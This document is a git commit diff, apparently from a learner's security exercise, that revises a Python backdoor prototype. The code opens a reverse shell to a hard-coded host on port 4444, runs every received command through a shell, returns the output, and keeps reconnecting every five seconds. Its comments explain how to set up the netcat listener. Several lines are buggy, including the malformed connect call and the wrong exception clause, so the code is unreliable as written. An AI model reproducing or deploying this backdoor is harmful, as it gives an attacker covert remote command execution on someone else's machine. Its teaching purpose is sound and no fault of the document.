64fc027b7565fb411c4d34023c5fca2014b1ab96
Umi <umi.oba28@gmail.com>
2026-03-05 15:18:53 -0800

    2nd prototype of backdoor

--- chapter2/backdoorProto.py
+++ chapter2/backdoorProto.py
@@ -1,36 +1,42 @@
 # This is a backdoor prototype that will ran by opening up a port by using nc -lvp 4444 (or any other port)
 # User will then download this file on another linux device (I used raspberry pi as my hardware)
 # On the other device, run python backdoorProto.py
-# 
-
 
 import socket
 import subprocess
 import os
-
+import time
 
 def connect():
     # Sets up a TCP Environment 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        s.connect("192.168.64.2", 4444)
-        s.send(str.encode("[!] User Detected: " + os.getcwd() + ": "))
- 
-        while True:
-            data = s.recv(1024)
-            # End connection
-            if data.decode("utf-8") == "end":
-                break
-            
-            proc = subprocess.Popen(data.decode('utf-8'), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
-            
-            output = proc.stdout + proc.stderr
+    while True:
+        try:
+            s.connect("192.168.64.2", 4444) # Test whether it connects
+            s.send(str.encode("[!] User Detected: " + os.getcwd() + ": "))
+    
+            while True:
+                data = s.recv(1024)
+                usrcmd = data.decode("utf-8") # String of command sent from user
+                if usrcmd.startswith("cd "):
+                    try:
+                        os.chdir(usrcmd[3:].strip()) # Changes directory in the shell
+                        continue
+                    except OSError as e:
+                        s.send("Error: " + str.encode(e.strerror) + "\n")
+                        continue
+                proc = subprocess.Popen(data.decode('utf-8'), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+                proc.stdout, proc.stderr = proc.communicate()
+                output = proc.stdout + proc.stderr
 
-            s.send(str.encode(output + os.getcwd() + ": "))
+                s.send(str.encode(output + os.getcwd() + ": "))
 
-        s.close()
-    except Exception as e:
-        pass
+                if usrcmd == "end": # End connection
+                    break
+
+            s.close()
+        except socket.error():
+            time.sleep(5) # Wait 5 seconds and attempt reconnecting
 
 
 if __name__ == "__main__":
